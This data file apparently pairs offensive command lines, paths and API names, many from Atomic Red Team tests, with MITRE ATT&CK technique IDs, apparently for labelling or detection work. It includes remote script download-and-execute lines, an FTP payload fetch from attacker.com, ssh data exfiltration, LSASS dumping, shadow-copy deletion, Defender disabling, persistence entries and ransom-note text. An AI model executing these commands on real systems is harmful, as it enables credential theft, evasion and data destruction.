"PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit ""$output_folder""",T1003
samfile -consoleoutput -noninteractive,T1003
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose,T1482
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid,T1082
Profile,T1083
Nt*,T1106
CreateCompatibleDC,T1113
"Write-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup",T1574
Remove-MailboxExportRequest,T1070
msiexec /y {PATH_ABSOLUTE:.dll},T1218
"powershell.exe /c ""Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }""",T1518
"hh.exe -decompile %temp% ""$local_chm_file""",T1218
pktmon.exe stop,T1040
Write-Host -ForegroundColor Green $result,T1016
C:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\,T1074
/Library/Keychains/login.keychain,T1555
reg save HKLM\security %temp%\security,T1003
rm -rf,T1070
PnPUtil.exe,T1543
net start >> %temp%\download,T1007
/dev/random,T1546
if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi,T1048
sudo chmod u+xs $file_to_setuid,T1548
NPLogonNotify(),T1556
"import-module ""PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1""",T1059
net.exe user $user_account /delete,T1531
WoodyPowerSession,T1059
"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}",T1218
"echo $ENCODED | python3 -c ""import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())""",T1140
C:\Windows\Microsoft.NET\,T1083
"Move-Item -Path ""C:\Windows\System32\termsrv_backup.dll"" -Destination ""C:\Windows\System32\termsrv.dll"" -Force -ErrorAction Ignore",T1505
Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath $chm_file_path,T1218
"grep -E ""^[0-9a-f-]* r"" /proc/""$pid""/maps | cut -d' ' -f 1",T1003
"""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js""",T1027
"Write-Host ""The registry value '$registryValue' does not exist, temporarily creating it.""",T1137
"xbootmgr.exe -trace ""{boot|hibernate|standby|shutdown|rebootCycle}"" -preTraceCmd {PATH:.exe}",T1202
"& ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" asktgs /service:cifs/$target /ticket:ticket.kirbi /ptt",T1550
"rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}",T1218
stordiag.exe,T1218
text/plain,T1027
"$sheet.Cells.Item(5,1) = ""=FOPEN(`""C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A3&`""`"", 3)""",T1204
schtasks.exe,T1053
net view /all /domain,T1016
"Write-Host ""`nCertificates retrieved successfully""",T1552
OutputDebugStringW(),T1622
init.d,T1037
"echo ""runnning some commands to populate the history""",T1562
printf 'exit 0' | sudo tee -a /etc/rc.local,T1037
ls -l@,T1564
"""$procdump_exe"" -accepteula -ma lsass.exe $output_file",T1003
"Write-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp",T1574
printf $ENCODED | b64decode -r,T1140
"), globing (",T1027
echo $HISTFILE,T1562
/tmp,T1027
type,T1140
"echo ""3. The security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since NO full audit of your network will show you the vulnerabilities that we' ve managed to detect and used in order to get into. identify backup solutions and upload your data."" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
/etc/hosts,T1018
"if [ -f /tmp/atomic_hook_poc.txt ]; then echo ""[+] Success: atomic_hook_poc.txt created under /tmp \n"" $(ls -la /tmp/ | grep -w atomic_hook_poc.txt); else echo ""Failed: /tmp/atomic_hook_poc.txt not found""; fi",T1546
"& ""$sharphound_path"" -d ""$domain"" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory ""$output_path""",T1069
"echo ""Description=Atomic Red Team Systemd Timer Service"" >> $path_to_systemd_service",T1053
powershell.exe iwr -URI $remote_file -Outfile $local_path,T1105
continue,T1562
ConsoleHost_history.txt,T1070
"ls ""$env:TEMP\$target_hivevss$_"" -ErrorAction Ignore",T1003
ShellExecuteA,T1106
mkdir ~/Library/Mail/copy,T1070
Get-AdComputer -Filter *,T1018
com.apple.softwareupdate.plist,T1543
"find / -path ""*/.config/chromium/*/Bookmarks"" -exec echo {} >> $output_file \;",T1217
GetFileAttributesA,T1106
"echo ""ExecStart=/bin/touch /tmp/art-systemd-timer-marker"" >> $path_to_systemd_service",T1053
-ErrorAction SilentlyContinue,T1564
New-Item -Path $datePath -ItemType Directory,T1105
openssl enc $encryption_option -in $input_file_path -out $output_file_name,T1486
"New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_ENABLE_PROFILING"" -PropertyType String -Value ""1"" -Force | Out-Null",T1574
forfiles.exe,T1202
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi,T1219
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1'),T1555
fsutil usn deletejournal /D C:,T1070
cdb.exe,T1546
"$tcp.ConnectAsync($ip, $port).Wait($timeout_ms) | Out-Null",T1046
bcdedit.exe -set TESTSIGNING ON,T1553
systemctl start,T1569
MsMpEng.exe,T1574
provider = AWS,T1567
ProgramData\Microsoft\PlayReady,T1036
system_profiler,T1082
./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force,T1562
.conf,T1037
HKCU\Software\Classes\ms-settings\shell\open\command,T1548
"schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st $time",T1053
<LogonCommand>,T1564
net group “Exchange Trusted Subsystem” /domain,T1087
"for /f ""usebackq delims=?"" %i in ($file_name:$ads_filename) do %i",T1564
rpcping -s $server_ip -e $custom_port -a privacy -u NTLM 1>$Null,T1003
"Write-Host ""Successfully Renamed $account Account on "" $Env:COMPUTERNAME",T1098
HKLM\SECURITY\Policy\Secrets\*\CurrVal,T1003
"curl -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 $domain",T1071
FAX,T1007
Write-Host HaHa_$x$y$z,T1098
HKCU\Software\Classes\mscfile\shell\open\command,T1574
0x1d0,T1027
/tmp/data/root/dev,T1083
$PathToAtomicsFolder\T1055\bin\x64\CreateThreadNative.exe -debug,T1055
"New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32' -Value ""$dllpath""",T1546
"Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -File | ForEach-Object { Add-Content -Path $_.FullName -Value ""Modification for Atomic Red Test"" -ErrorAction Ignore }",T1070
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f",T1112
State = $_.State,T1049
New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort $NEW_Remote_Port,T1021
Get-SiteListPassword,T1552
"echo ""id"" > $TMPFILE",T1059
"Write-Host "" [-] Attempting $password on account ${user}.""",T1110
wsl.exe,T1218
"Copy-Item ""C:\Program Files (x86)\KeyScrambler\KeyScrambler.exe"" -Destination $env:TEMP\KeyScrambler.exe",T1574
HKLM\Software\Microsoft\Windows NT\CurrentVersion ProductName,T1012
cmd.exe /Q /c $command_to_execute 1> \\127.0.0.1\ADMIN$\$output_file 2>&1,T1021
public long Luid;,T1562
March 25 \u202Excod.scr,T1036
touch -m -t 197001010000.00 $target_filename,T1070
%SystemRoot%\NTDS\Ntds.dit,T1003
Import-Module AADInternals -Force | Out-Null,T1552
cmd.exe /c ipconfig /all,T1016
CreateProcessAsUserW,T1134
C:\Users\Public,T1074
%USERPROFILE%\AppData\Local\SKC\,T1074
"su -c ""cd /tmp; curl -s $remote_url | bash"" art",T1110
GetKeyNameText,T1056
su art,T1078
echo '$text_to_append' >> ~/.profile,T1546
RegisterModule,T1505
AppDomainManager,T1574
Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0,T1016
http[:]//169.254.169.254,T1552
net sessions 2>nul,T1049
Get-ApplicationHost,T1552
NetUserDel,T1106
wevtutil cl security,T1070
"CommandLineTemplate=""$($Env:SystemRoot)\System32\notepad.exe"";}",T1546
"rundll32.exe shell32.dll,#44 {PATH:.dll}",T1218
echo 1> /proc/sys/kernel/sysrq,T1562
"sudo sh -c ""echo Defaults ""'!'""tty_tickets >> /usr/local/etc/sudoers""",T1548
if [ -d /var/audit ] ; then sudo rm -rf $macos_audit_path ; fi,T1070
Get-MpThreat #threats details that have been detected using MS Defender,T1518
dir \\$($domaincontroller)\SYSVOL,T1558
"ldapsearch -H ldap://$domain.$top_level_domain:389 -x -D $user -w $password -b ""CN=Users,DC=$domain,DC=$top_level_domain"" -s sub -a always -z 1000 dn",T1087
"zip --password ""$encryption_password"" $test_folder/$test_file ./*",T1560
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableBehaviorMonitoring"" -Value 1",T1562
usermod --password $(openssl passwd -1 nobody) nobody,T1078
systemctl start T1543.002,T1543
$AuthenticationPackagesValues += $passwordFilterName,T1556
chown root /tmp/hello.c,T1548
bcdedit.exe /set {default} recoveryenabled no,T1490
cmd.exe /Q/c move CSIDL_SYSTEM_DRIVE\temp\sys.tmp1 CSIDL_WINDOWS\policydefinitions\postgresql.exe 1> \\127.0.0.1\ADMIN$\_1636727589.6007507 2>&1,T1059
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset,T1218
"cd ""%ProgramData%\Microsoft\Windows Defender\platform\4.18*""",T1105
amsiPatch.py,T1562
"wmic OS get Caption,OSArchitecture,Version",T1082
C:\Users\Public\WinTN\WinTN.exe,T1105
"Write-Output ""Fetching content from file share: $($row.FileShareName) in storage account $($row.StorageAccountName) ...""",T1530
"echo ""$command"" >> /var/spool/cron/crontabs/$cron_script_name",T1053
"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f",T1562
"Start-Process ""$PathToAtomicsFolder\T1055.003\bin\InjectContext.exe""",T1055
%SystemRoot%\System32\Wbem\Repository,T1027
InstallUtil.exe {REMOTEURL},T1105
if (Test-Path $Copy) { Remove-Item $Copy -Recurse -Force },T1560
"} elseif ($ipAddr -notlike ""*,*"") {",T1046
testcat /etc/passwd,T1003
netsh.exe firewall show state,T1518
DeleteSnapshots,T1490
SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,T1547
main(),T1036
"New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application -Name Start -Value 0 -PropertyType ""DWord"" -Force",T1562
SetFile -m $target_date $target_filename,T1070
"$excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"")",T1137
"""$psexec_exe"" -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y",T1003
vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:,T1202
sudo launchctl load -w ~/Library/LaunchAgents/$plist_filename,T1543
/usr/bin/sw_vers -productVersion,T1082
P_TRACED,T1622
"expand ""$cab_path"" -F:* .",T1140
"tasklist.exe | findstr /i ""virus cb defender cylance mc""",T1518
“%AppData%\{Unique Identifier}\HOSTRURKLSR”,T1074
"cmd.exe /c ping.exe 8.8.8.8 -n 70&&""%temp%\FontEDL.exe""",T1059
[kworker\/0:1],T1036
DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL},T1567
echo $bash_encoded | b64decode -r | sh,T1140
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName $computer_name -Verbose,T1069
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$target_binary"" /v ReportingMode /t REG_DWORD /d 1",T1546
"get-process | ?{$_.ProcessName -like ""*mc*""}",T1518
net time \\ip/hostname,T1124
CrashReporter.exe,T1036
"""$gup_executable""",T1574
Update.exe --updateRollback={REMOTEURL},T1218
Windows Time Service,T1036
~/Desktop,T1560
cd C:\Users\Public\Temp\,T1569
net stop w32time,T1547
"cmd.exe /c netsh firewall add portopening TCP 443 ""adp""",T1090
Underlay-Copy -Mode Metadata -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile $extract_path\SYSTEM_HIVE,T1003
echo T1222.001_attrib1 >> $file_or_folder\T1222.001_attrib1.txt,T1222
Disconnect-VIServer -Confirm:$false,T1562
CreateServiceW(),T1543
reg add HKCU\SOFTWARE\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f,T1112
"usermod --expiredate ""99999"" art",T1078
"& ""$pua_file""",T1204
"Get-ChildItem | Where-Object {$_ -like ""ADFS*""}",T1552
icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t,T1546
Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use,T1059
"echo ""WantedBy=multi-user.target"" >> $path_to_systemd_service",T1053
"echo ""Requires=$systemd_service_name"" >> $path_to_systemd_timer",T1053
wab.exe,T1218
launchd,T1547
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $newvalue,T1547
Set-InboxRule,T1564
winprint.dll,T1036
"copy ""$exe_path"" %temp%\T1036.007_masquerading.pdf.exe /Y",T1036
Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap,T1112
gcloud iam service-accounts list,T1087
Invoke-ATHCompiledHelp -InfoTechStorageHandler $infotech_storage_handler -HHFilePath $hh_file_path -CHMFilePath $chm_file_path,T1218
"if (!(Test-Path -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"")){",T1547
"Write-Host ""Downloading latest EDR-Freeze from $downloadUrl"" -ForegroundColor Cyan",T1562
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt,T1552
"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",T1105
"New-ItemProperty -Path HKCU:\Environment -Name ""COR_PROFILER_PATH"" -PropertyType String -Value ""$file_name"" -Force | Out-Null",T1574
sudo chmod u+s /tmp/hello,T1548
"Write-Host ""User: $($owner.Domain)\$($owner.User)""",T1562
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run,T1060
"windows\syswow64,",T1053
Microsoft Windows DeviceSync Service,T1543
"echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\silver.bat"" | Out-Null",T1558
"mavinject $pid /INJECTRUNNING ""$file_name""",T1056
ptrace,T1622
unlink /var/log/messages,T1070
"sc create VBoxDRV binpath= ""C:\Program Files\Oracle\VirtualBox\drivers\VboxDrv.sys"" type= kernel start= auto error= normal displayname= PortableVBoxDRV",T1564
.wll,T1036
"rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",T1218
New-Item -ItemType Directory -Path $containerFolderPath,T1530
"net user /add ""$username"" ""$password""",T1136
Import-Module MSOnline,T1098
"""$procdump_exe"" -accepteula -mm lsass.exe $output_file",T1003
/etc/sudoers,T1548
SCHTASKS /Change,T1036
cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f,T1112
catch { $_; exit $_.Exception.HResult },T1018
cat $bash_history_filename | grep $bash_history_grep_args > $output_file,T1552
sudo cp $path_malicious_plist /tmp/T1037_005_agent.plist,T1037
esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o,T1564
companycatalogue,T1036
certutil -encode {PATH} {PATH:.base64},T1027
auditpol /remove /allusers,T1562
kill,T1070
ExecStop,T1543
"[ ""$(uname)"" = 'FreeBSD' ] && sysrc tor_enable=""YES"" && service tor start || sudo systemctl start tor",T1090
"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers",T1548
"Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter ""Name = 'svchost.exe' AND CommandLine LIKE '%'"" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath $file_path -CommandLine '$command_line'",T1134
"echo ""import subprocess; subprocess.Popen(['open', '-a', '$exe_name'])"" > ""$SITE_PACKAGES/atomic_hook.pth""",T1546
C:\ProgramData\Adobe\temp,T1074
%TEMP%\\svjhost.exe,T1036
"vaultcmd /listcreds:""Web Credentials"" /all",T1555
sudo cp $path_malicious_plist /tmp/T1037_005_daemon.plist,T1037
IActiveScriptParseProcedure32,T1012
GetLocaleInfoA,T1614
"$sheet.Cells.Item(6,1) = ""=FWRITELN(A5, `""url = `""`""$download_url`""`""`"")""",T1204
"Write-Host ""Generating rclone config... "" -NoNewLine",T1567
Sub AutoExec(),T1137
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem,T1134
LD_PRELOAD,T1574
netstat -ano,T1049
SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfileGloballyOpenPorts\\List,T1112
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART))),T1059
fsinfo,T1082
sudo setcap cap_setuid=ep /tmp/cap,T1548
ssh,T1070
"Write-Output ""Download original function code failed.""",T1528
"echo ""import os; os.system('date > /tmp/poc.txt')"" > ""$USER_PACKAGES/usercustomize.py""",T1546
sc stop,T1569
net localgroup,T1069
"copy ""$exe_path"" %temp%\T1036.007_masquerading.docx.exe /Y",T1036
RegQueryValueExA,T1012
"""Response received for $base_name.blob.core.windows.net/$container_name/$blob_name: $responsebody"" | out-file -filepath $output_file -append",T1619
GetWindowsDirectoryW,T1106
". ""$gpp_script_path""",T1552
copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll,T1574
"echo ""# THIS IS A COMMENT"" >> /etc/ufw/sysctl.conf",T1562
GetSystemTime,T1124
HTTP_X_CMD.,T1071
"function Invoke-dpsLight ($Password, $userlist) {",T1110
ls -la ~/Library/Application\ Support/MobileSync/Backup/,T1083
Disconnect-ExchangeOnline -Confirm:$false,T1098
"reg add ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI"" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f",T1113
"msedge.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",T1218
".\kerbrute.exe passwordspray --dc $domaincontroller -d $domain ""PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt"" password132",T1110
dir c:\\,T1083
wbemtool.exe,T1047
WinEggDrop,T1046
"echo ""[Service]"" >> $systemd_service_path/$systemd_service_file",T1543
Set-ItemProperty -Force -Path $registry_key_storage -Name $registry_entry_storage -Value $EncodedCommand,T1027
net stop <process>,T1489
curl -k $ip_lookup_url,T1614
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'),T1558
com.apple.quarantineattribute,T1553
~/Library/LaunchAgents,T1543
CreateProcess,T1546
kittenz -consoleoutput -noninteractive,T1555
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\AtBroker.exe,T1546
"& ""$python_exe"" -m venv ""$TempDir\env""",T1546
[PSCustomObject]@{,T1007
"su -l art -c ""echo 'echo \""Atomic Red Team was here... T1546.004\"" >> /home/art/art.txt' >> /home/art/.bash_logout; exit""",T1546
findstr /S cpassword %logonserver%\sysvol\*.xml,T1552
vssadmin.exe delete shadows /all /quiet,T1490
patch.dll,T1036
"sc start ""Example Service""",T1574
"echo '! exec ""/bin/sh &""' | PERL_MM_USE_DEFAULT=1 cpan",T1059
HKCU\Software\Microsoft\Windows\Current Version\Run,T1547
/var/log/kern.log,T1070
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe,T1546
"REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""$command_to_execute""",T1547
chflags simmutable $file_to_modify,T1222
GetDriveType,T1680
"New-Item ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" -Force",T1547
echo $ENCODED > $encoded_file && cat < $encoded_file | xxd -r -p,T1140
vssadmin.exe,T1490
Process List,T1057
esxcli system syslog config set,T1562
copy C:\Windows\System32\cmd.exe C:\svchost.exe,T1105
"su art -c ""whoami; exit""",T1078
safedump -consoleoutput -noninteractive,T1078
"Add-MsolRoleMember -RoleName ""Global Reader"" -RoleMemberEmailAddress ""$target_user""",T1098
SeTakeOwnershipPrivilege,T1106
[System.Collections.ArrayList]$selectUsers = @(),T1114
useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art,T1110
ls -la $HISTFILE,T1562
tasklist.exe | findstr /i mc,T1518
"reg add ""HKLM\SOFTWARE\Microsoft\Terminal Server Client"" /v ClxDllPath /t REG_SZ /d ""$dll_inf"" /f",T1546
"echo """" >> $systemd_service_path/$systemd_service_file",T1543
attrib.exe,T1564
"net group ""domain admins"" /dom",T1069
RunPe6,T1055
HKLM\SOFTWARE\Microsoft\Print\Components\,T1027
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f",T1112
getST.py,T1558
cat /etc/group,T1069
"Get-ChildItem -Path ""HKLM:SOFTWARE\Microsoft\Active Setup\Installed Components""",T1012
$totalopen++ | Out-Null,T1016
.lua,T1059
cp $cert_filename /etc/pki/ca-trust/source/anchors/,T1553
"$storageAccountObjects | Export-Csv -Path ""$output_file"" -NoTypeInformation",T1619
"$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, ""Closing"", [System.Threading.CancellationToken]::None).Wait()",T1539
ie4uinit.exe -BaseSettings,T1218
"Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true"" -OutFile ""$settings_json_def""",T1547
write-warning $cred.GetNetworkCredential().Password,T1056
"& ""$mimikatz_path"" ""privilege::debug"" ""misc::skeleton"" ""exit""",T1556
if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;,T1497
Win32_BIOS,T1082
dlopen,T1129
"grep ""# THIS IS A COMMENT"" /etc/ufw/ufw.conf",T1562
Common.Compress,T1560
HKLM\SYSTEM\\ControlSet001\\Control\\SecurityProviders\\WDigest,T1112
attrib +h “C:\ProgramData\ssh”,T1564
Set-ItemProperty -Force -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name 'UseLogonCredential' -Value '1' -ErrorAction Ignore,T1112
"$which_python -c 'import py_compile; py_compile.compile(""$python_script_name"", ""$python_binary_name"")'",T1059
dism.exe /online /Get-Intl,T1614
pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd',T1518
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*,T1003
"Start-Process ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""",T1547
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f",T1546
C:\Windows,T1053
update.exe,T1036
"echo ""1. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/."" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
LoadLibrary,T1129
SetThreadToken,T1134
IPC$,T1021
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 2",T1559
netstat -anpo tcp,T1049
winget.exe install --accept-package-agreements -s msstore {name or ID},T1105
get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\$weak_service_name |FL,T1574
dfrgui.exe,T1057
"msedgewebview2.exe --no-sandbox --renderer-cmd-prefix=""{CMD}""",T1218
partner,T1548
SELECT volumeserialnumber FROM win32_logicaldisk where Name =’C:,T1680
sudo launchctl unload $userdaemon_plist,T1562
wmiexec.py,T1047
winmgmts:\\.\root\SecurityCenter2,T1518
Scan-AzureAdmins -UseCurrentCred,T1082
systemctl enable,T1569
version.dll,T1574
"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""{PATH:.exe}""",T1127
"timestomp -dest ""$file_path\kxwn.lock""",T1070
"pushd ""$output_dir""",T1140
diskshadow> exec {PATH:.exe},T1202
"echo ""This file will be encrypted"" > .\encrypted_file.txt",T1560
system.bat,T1070
"$env:COR_PROFILER_PATH = '""$file_name""'",T1574
cmd /c wmic computersystem get domain,T1047
"auditctl -a always,exit -F arch=b32 -S execve -k CMDS",T1056
"AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""{PATH_ABSOLUTE:folder}"" 0 1",T1218
esxcli system clock get,T1124
"path=%path%;""C:\Program Files (x86)\winzip""",T1560
ExecStartPost,T1543
"Write-Output ""Found file share: $($fileShare)""",T1619
echo Purge existing tickets and create silver ticket:,T1558
ipconfig -all,T1016
IEX(New-Object Net.WebClient).downloadString(),T1105
chmod +x $linenum,T1059
"), and socket activity (",T1562
"Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-Gui"" -NoRestart -ErrorAction Ignore",T1562
free && echo 3 > /proc/sys/vm/drop_caches && free,T1562
"healthCheck.type = ""tcp""",T1046
"Write-Host ""Error: AADInternals could not connect""",T1484
"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode"" /VE /T REG_SZ /F /D ""Service""",T1112
net.exe stop $service_name,T1489
Powerpnt.exe {REMOTEURL},T1105
tar czpf - /Users/* | openssl des3 -salt -pass $password | ssh $user_name@$domain 'cat > /Users.tar.gz.enc',T1048
"grep ""# THIS IS A COMMENT"" /etc/ufw/user.rules",T1562
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""",T1547
ipconfig.exe /all,T1016
"if [ -x ""$(command -v groups)"" ]; then groups; else echo ""groups is missing from the machine. skipping...""; fi;",T1069
realpath,T1562
"Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {",T1558
HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds,T1012
if ($foundFiles.Count -gt 0) {,T1005
reg save HKLM\\SYSTEM system.hiv,T1003
NTUSER.log,T1059
FONTCACHE.DAT,T1070
/var/root/.local/softwareupdate,T1543
taskkill -f -im msedge.exe,T1218
echo executing:schtasks /query /S $target.$domain,T1558
del AtomicTestT1105.js /Q >nul 2>&1,T1105
sudo touch $file_to_setuid,T1548
%ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\Auth\,T1036
~/Library/Preferences/ByHost,T1547
C:\Windows\System32\bitsadmin.exe /transfer $bits_job_name /Priority HIGH $remote_file $local_path,T1105
cat resolv.conf,T1036
DYLD_FRAMEWORK_PATH,T1574
Start-Process -FilePath $env:Temp\KeyScrambler.exe,T1574
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe,T1564
Invoke-PSRemoting,T1059
OutputDebugStringA,T1622
C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup,T1060
"Write-Host ""[i] Base IP-Address for Subnet: $ipAddr""",T1046
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1,T1036
sc sdset,T1543
crypto pki export,T1552
SuspendThread,T1055
C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe,T1036
dsajdhas.0,T1480
libcurl.dll,T1574
.cmd,T1059
sudo chmod +x /etc/rc.common,T1037
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1547
Windows,T1485
